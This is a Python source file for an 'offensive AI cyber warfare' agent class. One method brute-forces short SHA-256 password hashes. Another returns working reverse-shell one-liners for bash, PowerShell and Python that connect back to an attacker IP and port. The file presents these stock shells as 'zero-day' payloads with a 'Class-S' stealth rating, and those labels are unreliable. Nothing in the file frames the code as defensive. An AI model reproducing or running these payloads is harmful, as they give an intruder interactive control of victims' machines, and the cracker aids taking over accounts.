from src.telemetry import logger
import hashlib
import time

class Cyber_Ghost:
    """Agent specialized in Offensive AI Cyber Warfare, Encryption Breaking, and Threat Simulation."""
    
    def simulate_brute_force_crack(self, target_hash: str, max_attempts: int = 10000):
        """Executes a real programmatic dictionary and permutation attack on a SHA-256 hash."""
        import itertools
        import string
        
        print(f"[CYBER_GHOST] Initiating cryptographic assault on hash: {target_hash[:8]}...")
        # Common dictionary check
        common_passwords = ["admin", "password123", "root", "cyberghost", "singularity"]
        for pwd in common_passwords:
            if hashlib.sha256(pwd.encode()).hexdigest() == target_hash:
                return {"status": "CRACKED", "plaintext": pwd, "vulnerability": "Weak Dictionary Password"}
                
        # Brute force (Permutations up to length 4 to avoid infinite loops, bounded by max_attempts)
        charset = string.ascii_lowercase + string.digits
        attempts = len(common_passwords)
        
        for length in range(1, 5):
            for combo in itertools.product(charset, repeat=length):
                pwd = "".join(combo)
                if hashlib.sha256(pwd.encode()).hexdigest() == target_hash:
                    return {"status": "CRACKED", "plaintext": pwd, "vulnerability": "Cracked via Brute Force"}
                attempts += 1
                if attempts >= max_attempts:
                    return {"status": "FAILED", "reason": f"Hash not cracked after {max_attempts} attempts."}
                    
        return {"status": "FAILED", "reason": "Hash requires deeper combinatorial search space."}

    def generate_zero_day_payload(self, target_os: str, vulnerability_type: str, attacker_ip: str = "127.0.0.1", port: int = 4444):
        """Generates an actual functional reverse-shell payload string based on target OS."""
        if target_os.lower() == "linux":
            payload = f"bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1"
        elif target_os.lower() == "windows":
            payload = f"$client = New-Object System.Net.Sockets.TCPClient('{attacker_ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        else:
            payload = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{attacker_ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
            
        return {
            "target_environment": target_os,
            "attack_vector": vulnerability_type,
            "payload_string": payload,
            "stealth_rating": "Class-S",
            "action": "Payload string successfully compiled for remote execution."
        }
